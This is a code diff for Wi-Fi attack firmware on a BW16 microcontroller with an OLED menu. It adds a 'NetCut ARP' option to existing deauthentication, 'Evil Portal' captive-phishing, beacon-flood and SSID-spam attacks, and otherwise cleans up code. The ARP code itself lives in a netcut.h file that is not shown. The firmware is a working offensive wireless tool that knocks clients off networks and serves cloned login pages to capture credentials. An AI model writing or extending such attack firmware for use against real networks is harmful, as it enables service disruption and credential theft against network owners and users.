@@ -15,6 +15,7 @@
 #include "debug.h"
 #include "WiFi.h"
 #include "dns.h"
+#include "netcut.h"
 #include <lwip/lwip_v2.0.2/src/include/lwip/priv/tcp_priv.h>
 
 // Captive portals
@@ -46,7 +47,7 @@ U8G2_SH1106_128X64_NONAME_F_HW_I2C u8g2(U8G2_R0, /* reset=*/ U8X8_PIN_NONE);
 #define BTN_RIGHT PA15
 #define BTN_SEL   PA13
 
-enum MenuState { MAIN_MENU, SCANNING, WIFI_LIST, ATTACK_MENU, RUNNING_ATTACK };
+enum MenuState { MAIN_MENU, SCANNING, WIFI_LIST, ATTACK_MENU, RUNNING_ATTACK, NETCUT_MENU };
 MenuState currentState = MAIN_MENU;
 
 // Attack vars
@@ -79,7 +80,6 @@ extern u8 rtw_get_band_type(void);
 bool apActive = false;
 int status = WL_IDLE_STATUS;
 WiFiServer server(80);
-// removed dup
 String ssid="";
 uint32_t current_num = 0;
 
@@ -148,8 +148,8 @@ void drawMenu() {
   u8g2.setFont(u8g2_font_ncenB08_tr);
 
   if (currentState == MAIN_MENU) {
-    const char* items[] = {"Scan Networks", "Random SSID", "Rickroll SSID", "Stop All"};
-    max_menu_items = 4;
+    const char* items[] = {"Scan Networks", "Random SSID", "Rickroll SSID", "NetCut ARP", "Stop All"};
+    max_menu_items = 5;
     u8g2.drawStr(0, 10, "--- Main Menu ---");
     for (int i = 0; i < max_menu_items; i++) {
       int y = 25 + (i * 12);
@@ -162,7 +162,7 @@ void drawMenu() {
     u8g2.drawStr(0, 30, "Scanning...");
   } else if (currentState == WIFI_LIST) {
     u8g2.drawStr(0, 10, "--- Select Target ---");
-    max_menu_items = scan_results.size() + 1; // +1 for "Back"
+    max_menu_items = scan_results.size() + 1;
 
     int items_per_page = 4;
     int end_item = std::min(max_menu_items, scroll_offset + items_per_page);
@@ -192,6 +192,9 @@ void drawMenu() {
   } else if (currentState == RUNNING_ATTACK) {
     u8g2.drawStr(0, 20, "Running Attack...");
     u8g2.drawStr(0, 40, "Press SEL to Stop");
+  } else if (currentState == NETCUT_MENU) {
+    u8g2.drawStr(0, 20, "NetCut ARP");
+    u8g2.drawStr(0, 40, "Starting scan...");
   }
 
   u8g2.sendBuffer();
@@ -203,13 +206,7 @@ String parseRequest(String request) {
   return request.substring(path_start, path_end);
 }
 
-//DNS
-// removed dup
-
-
-
-bool serveBegined =false;
-
+bool serveBegined = false;
 
 void createAP(char* ssid, char* channel, char* password){
   int mode;
@@ -223,7 +220,6 @@ void createAP(char* ssid, char* channel, char* password){
   wext_get_mode(ifname, &mode);
   Serial.print("WLAN 1 ");
   Serial.println(mode);
-
 
   DEBUG_SER_PRINT("CREATING AP");
   DEBUG_SER_PRINT(ssid);
@@ -240,7 +236,6 @@ void createAP(char* ssid, char* channel, char* password){
   unbind_dns();
   delay(1000);
 
-  //Creamos un nuevo servicio de dns
   start_DNS_Server();
   if(!serveBegined){
     server.begin();
@@ -258,18 +253,17 @@ void createAP(char* ssid, char* channel, char* password){
   Serial.print("WLAN 1 ");
   Serial.println(mode);
 }
-void createAP(char* ssid, char* channel){
 
+void createAP(char* ssid, char* channel){
   createAP(ssid, channel, "");
 }
-void destroyAP(){
-  //udp_remove(dns_server_pcb);
 
+void destroyAP(){
   void unbind_all_udp();
   delay(500);
   WiFiClient client = server.available();
   while(client.connected()){
-    DEBUG_SER_PRINT("PArando cliente");
+    DEBUG_SER_PRINT("Stopping client");
     DEBUG_SER_PRINT(client);
     client.flush();
     client.stop();
@@ -288,11 +282,7 @@ void destroyAP(){
   WiFi.status();
   int channel;
   wifi_get_channel(&channel);
-
-
-
 }
-
 
 String makeResponse(int code, String content_type, bool compresed) {
   String response = "HTTP/1.1 " + String(code) + " OK\n";
@@ -309,10 +299,9 @@ void handle404(WiFiClient &client) {
   client.write(response.c_str());
 }
 
-
-void handleRequest(WiFiClient &client,enum portals portalType,String ssid){
+void handleRequest(WiFiClient &client, enum portals portalType, String ssid){
   const char *webPage;
-  String generatedWebPage; // Hold the String object in scope
+  String generatedWebPage;
   size_t len;
   bool compresed = false;
   switch(portalType){
@@ -355,8 +344,6 @@ void handleRequest(WiFiClient &client,enum portals portalType,String ssid){
   String response = makeResponse(200, "text/html", compresed);
   client.write(response.c_str());
 
-
-
   size_t chunkSize = 5000;
 
   for (size_t i = 0; i < len; i += chunkSize) {
@@ -374,17 +361,16 @@ void handleRequest(WiFiClient &client,enum portals portalType,String ssid){
           return;
         }
         delay(1);
-  }
+   }
 
-  delay(10);
-   while(client.available()){
-            client.read();
-            delay(1);
-            }
+   delay(10);
+    while(client.available()){
+             client.read();
+             delay(1);
+             }
 }
 
 int scanNetworks(int miliseconds) {
-
   scan_results.clear();
   if (wifi_scan_networks(scanResultHandler, NULL) == RTW_SUCCESS) {
     delay(miliseconds);
@@ -407,6 +393,8 @@ void setup() {
 
   WiFi.enableConcurrent();
   WiFi.status();
+  
+  Serial.println("[FIRMWARE] BW16 with NetCut ARP initialized");
 }
 
 void loop() {
@@ -425,7 +413,7 @@ void loop() {
       case MAIN_MENU:
         if (selected_menu_item == 0) {
           currentState = SCANNING;
-          drawMenu(); // Draw "Scanning..."
+          drawMenu();
           scanNetworks(5000);
           currentState = WIFI_LIST;
           selected_menu_item = 0;
@@ -437,6 +425,14 @@ void loop() {
           rickroll = true;
           currentState = RUNNING_ATTACK;
         } else if (selected_menu_item == 3) {
+          // NetCut ARP Menu
+          currentState = NETCUT_MENU;
+          drawMenu();
+          delay(1000);
+          netcutMenu();
+          currentState = MAIN_MENU;
+          selected_menu_item = 0;
+        } else if (selected_menu_item == 4) {
           deauth_wifis.clear();
           randomSSID = false;
           rickroll = false;
@@ -458,10 +454,10 @@ void loop() {
         break;
 
       case ATTACK_MENU:
-        if (selected_menu_item == 0) { // Deauth
+        if (selected_menu_item == 0) {
           deauth_wifis.push_back(selected_wifi_index);
           currentState = RUNNING_ATTACK;
-        } else if (selected_menu_item == 1) { // Evil Portal
+        } else if (selected_menu_item == 1) {
           int str_len = scan_results[selected_wifi_index].ssid.length() + 1;
           char char_array[str_len];
           scan_results[selected_wifi_index].ssid.toCharArray(char_array, str_len);
@@ -469,10 +465,10 @@ void loop() {
           itoa(scan_results[selected_wifi_index].channel, buffer, 10);
           createAP(char_array, buffer);
           currentState = RUNNING_ATTACK;
-        } else if (selected_menu_item == 2) { // Beacon Flood
+        } else if (selected_menu_item == 2) {
           ssid = scan_results[selected_wifi_index].ssid;
           currentState = RUNNING_ATTACK;
-        } else if (selected_menu_item == 3) { // Back
+        } else if (selected_menu_item == 3) {
           currentState = WIFI_LIST;
           selected_menu_item = 0;
           scroll_offset = 0;
@@ -480,7 +476,6 @@ void loop() {
         break;
 
       case RUNNING_ATTACK:
-        // Stop attack
         if (apActive) destroyAP();
         deauth_wifis.clear();
         randomSSID = false;
@@ -550,7 +545,6 @@ void loop() {
     }
   }
 
-
   if (apActive) {
     WiFiClient client = server.available();
     if (client) {
@@ -567,34 +561,34 @@ void loop() {
             }
             String path = parseRequest(request);
             Serial.println(request);
-            if(path.startsWith("/generate_204")||path.startsWith("/ncsi.txt")||path.startsWith("/success.html")||path.startsWith("/userinput")||path.startsWith("/login")||path.startsWith("/?")||path.equals("/")||path.startsWith("/get")){
+            if(path.startsWith("/generate_204")||path.startsWith("/ncsi.txt")||path.startsWith("/success.html")||path.startsWith("/userinput")||path.startsWith("/login")||path.startsWith("/?")) {
               if (deauth_wifis.size() != 0)
                 handleRequest(client, (enum portals)portal, scan_results[deauth_wifis[0]].ssid);
               else
                 handleRequest(client, (enum portals)portal, "router");
-          }else{
-            handle404(client);
-          }
-          break;
-          }else if(character == '%'){
-            char buff[2] ;
-            client.read(buff,2);
-            char value = (char)strtol(buff, NULL, 16);
-            if(value <= 127){
-              character = value;
-            }else{
-              request += "%";
-              request += buff[0];
-              request += buff[1];
-            }
-          }
-          request += character;
-          delay(10);
-        }
-      }
-      delay(50);
-      client.stop();
-    }
+           }else{
+             handle404(client);
+           }
+           break;
+           }else if(character == '%'){
+             char buff[2] ;
+             client.read(buff,2);
+             char value = (char)strtol(buff, NULL, 16);
+             if(value <= 127){
+               character = value;
+             }else{
+               request += "%";
+               request += buff[0];
+               request += buff[1];
+             }
+           }
+           request += character;
+           delay(10);
+         }
+       }
+       delay(50);
+       client.stop();
+     }
   }
 
   delay(50);
